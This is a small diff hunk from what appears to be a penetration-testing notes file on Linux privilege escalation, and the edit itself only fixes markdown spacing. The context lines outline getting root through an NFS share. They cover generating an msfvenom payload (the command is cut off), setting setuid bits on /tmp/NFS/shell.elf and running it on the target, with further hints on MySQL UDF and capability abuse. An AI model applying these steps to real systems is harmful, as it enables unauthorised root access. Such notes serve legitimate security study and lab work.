@@ -795,7 +795,7 @@ On local Kali machine, as root, generate an exec payload ```msfvenom -p linux/x8
 Set permission bits: ```chmod +xs /tmp/NFS/shell.elf``` \
 Run the payload on target machine => root acquired
 
-** If MySQL is running on host as root -> potential UDF prives, check out Banzai@OSPG write up**
+**If MySQL is running on host as root -> potential UDF prives, check out Banzai@OSPG write up**
 
 
 **Check for any Linux capabilities (e.g: set_uid capabilities):** \
